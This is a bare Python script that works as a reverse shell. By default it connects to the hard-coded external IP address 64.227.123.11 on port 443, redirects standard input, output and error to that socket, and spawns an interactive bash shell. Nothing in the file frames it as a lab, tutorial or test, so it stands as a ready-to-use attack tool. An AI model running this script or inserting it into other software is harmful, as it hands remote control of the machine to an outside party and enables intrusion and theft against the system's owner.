#!/usr/bin/env python3
import os
import pty
import socket

RHOST = os.getenv("RHOST", "64.227.123.11")
RPORT = int(os.getenv("RPORT", "443"))

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    # Redirect stdin, stdout, stderr to the socket
    for fd in (0, 1, 2):
        os.dup2(s.fileno(), fd)

    # Spawn a bash shell
    pty.spawn("/usr/bin/bash")

if __name__ == "__main__":
    main()
